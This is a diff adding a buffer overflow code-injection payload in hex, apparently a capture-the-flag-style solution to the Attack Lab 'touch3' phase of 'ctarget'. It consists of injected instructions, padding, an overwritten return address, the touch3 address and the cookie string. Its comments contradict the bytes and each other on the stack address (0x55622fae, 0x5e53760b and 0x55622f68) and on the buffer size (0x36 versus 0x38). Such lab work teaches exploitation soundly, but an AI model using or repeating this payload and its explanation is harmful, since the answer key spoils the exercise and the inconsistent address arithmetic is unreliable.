@@ -1,0 +1,10 @@
+48 c7 c7 b0 2f 62 55 c3 /* binary code of  movq $0x55622fae, %rdi , retq (0x55622fae is the address where the cookie starts = line 10 ($rsp(0x5e53760b)+buffer_size(0x36)+line9(0x8)+line8(0x8)) */
+00 00 00 00 00 00 00 00 /* (%rsp) 0x55622f68 + (buffer) 0x38 + 0x8 (bytes for return address of rsp) + 0x8 (bytes for touch3)    */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* the first 56 bytes are just padding */
+68 2f 62 55 00 00 00 00 /* address of register %rsp 0x55622f68 */
+13 1d 40 00 00 00 00 00 /* touch3 address = 401d13 (see asm - dump  file of ctarget) */
+35 65 35 33 37 36 30 62 /* cookie string of 5e53760b (5 ascii = 35 hex)*/
